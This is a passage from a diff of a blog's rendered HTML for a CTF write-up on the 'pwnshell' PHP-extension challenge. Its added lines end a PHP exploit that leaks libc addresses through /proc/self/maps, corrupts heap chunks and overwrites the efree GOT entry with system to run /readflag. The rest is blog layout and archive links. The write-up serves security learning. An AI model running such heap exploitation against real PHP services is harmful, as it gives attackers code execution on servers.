+    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$buffer</span><span class="token punctuation">,</span> <span class="token variable">$libc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$p1</span><span class="token punctuation">,</span> <span class="token variable">$buffer</span><span class="token punctuation">,</span> <span class="token variable">$mbase</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$libc</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$mbase</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+
+<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"leakaddr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/proc/self/maps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$buffer</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">leakaddr</span><span class="token punctuation">(</span><span class="token variable">$buffer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$libc_base</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token variable">$libc</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mod_base</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token variable">$mbase</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$system_addr</span> <span class="token operator">=</span> <span class="token number">0x4c490</span><span class="token punctuation">;</span>
+<span class="token variable">$efree_got</span> <span class="token operator">=</span> <span class="token number">0x4038</span><span class="token punctuation">;</span>
+
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"b"</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// fgetc(STDIN);</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0xe</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">0x61</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
+    <span class="token variable">$aa</span> <span class="token operator">=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span> <span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token variable">$aa</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">addHacker</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// fgetc(STDIN);</span>
+<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/readflag > /var/www/html/flag.txt\x00"</span><span class="token punctuation">;</span>
+<span class="token function">editHacker</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">removeHacker</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">addHacker</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">removeHacker</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">editHacker</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token function">int2str</span><span class="token punctuation">(</span><span class="token variable">$mod_base</span><span class="token operator">+</span><span class="token variable">$efree_got</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">addHacker</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">int2str</span><span class="token punctuation">(</span><span class="token variable">$libc_base</span><span class="token operator">+</span><span class="token variable">$system_addr</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">addHacker</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// fgetc(STDIN);</span>
+<span class="token function">removeHacker</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+	  <div class="article-footer-copyright">
+	Ciallo～(∠・ω< )⌒★
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
     
-        <div class="license-wrapper">
-            <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
-            <p>Link：<a href="https://nyyyddddn.github.io/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">https://nyyyddddn.github.io/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/</a>
-            <p>Publish date：<a href="https://nyyyddddn.github.io/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">June 30th 2024, 11:52:51 pm</a>
-            <p>Update date：<a href="https://nyyyddddn.github.io/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">June 30th 2024, 11:55:47 pm</a>
-            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
     
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2024/07/15/wkctf-pwn/" title="wkctf_pwn">
-                    <div class="nextTitle">wkctf_pwn</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2024/06/25/xctf-ggbord%E5%A4%8D%E7%8E%B0/" title="xctf_ggbord复现">
-                    <div class="prevTitle">xctf_ggbord复现</div>
-                </a>
-            
-        </li>
+    <a href="/2024/07/15/wkctf-pwn/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/06/25/xctf-ggbord复现/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-06-30 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/ctf-writeup/">ctf writeup<span>51</span></a></li>
     </ul>
-    <!-- comment -->
-    
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
+	</div>
+		
 
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
 
-            
+		
 
-            
+	</div>
+	
+		
 
-            
+</div><!-- row -->
 
-            <!-- utteranc评论 -->
-
-
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
-
-
-            
-            
-
-            
-
-        </div>
-    
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
-    
-    <!-- Mathjax -->
-    
-</main>
-
-                <!-- profile -->
-                
-            </div>
-            <footer class="footer footer-unloaded">
-    <!-- social  -->
-    
-        <div class="social">
-            
-    
-        
-            
-                <a href="mailto:1959759892@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/nyyyddddn" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-
-
-        </div>
-    
-    <!-- powered by Hexo  -->
-    <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
-    </div>
-    <!-- website approve for Chinese user -->
-    
-    <!-- 不蒜子  -->
-    
-        <div class="busuanzi-container">
-            
-             
-                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
-            
-        </div>
-    	
-</footer>
-
-        </div>
-        <!-- toc -->
-        
-            <div class="toc-wrapper toc-wrapper-loding" style=
+<!--
+ -->
 
 
 
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 nyyyddddn's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
 
 
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
 
 
-    top:50vh;
-
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnshell-%E5%A4%8D%E7%8E%B0-php-pwn"><span class="toc-number">1.</span> <span class="toc-text">pwnshell 复现 (php pwn)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">如何调试？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%9B%B8%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">调试相关的命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85gdbserver"><span class="toc-number">1.2.1.</span> <span class="toc-text">安装gdbserver</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">构建镜像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E5%AE%B9%E5%99%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">开启容器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdbserver%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">gdbserver的使用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-number">1.3.</span> <span class="toc-text">如何分析程序逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-addHacker"><span class="toc-number">1.3.1.</span> <span class="toc-text">zif_addHacker</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">php变量类型的表示方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-removeHacker"><span class="toc-number">1.3.2.</span> <span class="toc-text">zif_removeHacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-editHacker"><span class="toc-number">1.3.3.</span> <span class="toc-text">zif_editHacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-displayHacker"><span class="toc-number">1.3.4.</span> <span class="toc-text">zif_displayHacker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
-            </div>
-        
-        <!-- sidebar -->
-        <div class="sidebar sidebar-hide">
-    <ul class="sidebar-tabs sidebar-tabs-active-0">
-        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
-        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
-        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
-    </ul>
-    <div class="sidebar-content sidebar-content-show-archive">
-        <div class="sidebar-panel-archives">
-    <!-- 在 ejs 中将 archive 按照时间排序 -->
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-    
-    
-    
-    <div class="total-and-search">
-        <div class="total-archive">
-        Total : 64
-        </div>
-        <!-- search  -->
-        
-    </div>
-    
-    <div class="post-archive">
-    
-        
-            
-            
-            <div class="archive-year"> 2025 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/29</span>
-            <a class="archive-post-title" href="/2025/04/29/hackergame2024%E5%A4%8D%E7%8E%B0/">hackergame2024复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span>
-            <a class="archive-post-title" href="/2025/04/09/Squ1rrelCTF/">Squ1rrelCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span>
-            <a class="archive-post-title" href="/2025/01/27/KnightCTF/">KnightCTF</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2024 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span>
-            <a class="archive-post-title" href="/2024/10/23/geekgame2024/">geekgame2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/07</span>
-            <a class="archive-post-title" href="/2024/09/07/byuctf-iot/">byuctf_iot</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/02</span>
-            <a class="archive-post-title" href="/2024/09/02/gdbjail/">gdbjail</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/01</span>
-            <a class="archive-post-title" href="/2024/08/01/ImaginaryCTF/">ImaginaryCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/22</span>
-            <a class="archive-post-title" href="/2024/07/22/dasctf2024-summer-challenge/">dasctf2024_summer_challenge</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span>
-            <a class="archive-post-title" href="/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">d3ctf_pwnshell复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/04</span>
-            <a class="archive-post-title" href="/2024/06/04/litctf2024-pwn/">litctf2024_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/27</span>
-            <a class="archive-post-title" href="/2024/05/27/DragonKnightCTF-pwn/">DragonKnightCTF_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span>
-            <a class="archive-post-title" href="/2024/05/22/ciscn-pwn/">ciscn_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/15</span>
-            <a class="archive-post-title" href="/2024/05/15/hnctf-pwn/">hnctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/14</span>
-            <a class="archive-post-title" href="/2024/05/14/miniL2024-pwn/">miniL2024_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/28</span>
-            <a class="archive-post-title" href="/2024/04/28/hznuctf/">hznuctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/24</span>
-            <a class="archive-post-title" href="/2024/04/24/geekcon/">geekcon</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span>
-            <a class="archive-post-title" href="/2024/03/15/CyberApocalypse-2024-Hacker-Royale-wp/">CyberApocalypse_2024_Hacker_Royale_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/27</span>
-            <a class="archive-post-title" href="/2024/02/27/hgame2024week3-wp/">hgame2024week3_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/14</span>
-            <a class="archive-post-title" href="/2024/02/14/hgame2024week2-pwn-wp/">hgame2024week2_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/11</span>
-            <a class="archive-post-title" href="/2024/02/11/0xl4ugh-pwn/">0xl4ugh_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/07</span>
-            <a class="archive-post-title" href="/2024/02/07/hgame2024week1-wp/">hgame2024week1_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/06</span>
-            <a class="archive-post-title" href="/2024/02/06/beginctf2024-wp/">beginctf2024_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/02</span>
-            <a class="archive-post-title" href="/2024/01/02/cbctf/">cbctf</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2023 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/hackergame2023/">Hackergame2023</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/29</span>
-            <a class="archive-post-title" href="/2023/11/29/isctf/">isctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span>
-            <a class="archive-post-title" href="/2023/11/05/newstar-week2/">newstar_week2</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/21</span>
-            <a class="archive-post-title" href="/2023/10/21/0xgame/">0xgame</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/26</span>
-            <a class="archive-post-title" href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">exp本地不通远程通的问题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/">cdn绕过大全tips思路</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/cnss2023/">cnss2023</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> Invalid date </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span>
-            <a class="archive-post-title" href="/2023/09/18/hello-world/">Hello World</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2025 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/03</span>
-            <a class="archive-post-title" href="/2025/05/03/rust%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E6%89%80%E6%9C%89%E6%9D%83%E4%B8%8E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/">rust入门_数据所有权与生命周期管理</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span>
-            <a class="archive-post-title" href="/2025/01/27/x3ctf/">x3ctf</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2024 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/04</span>
-            <a class="archive-post-title" href="/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">羊城杯2024pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/nss3rd%E5%87%BA%E9%A2%98-Iterator-Trap%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">nss3rd出题_Iterator_Trap解题思路</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/srctf-pwn%E5%87%BA%E9%A2%98/">srctf_pwn出题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/xyctf/">xyctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span>
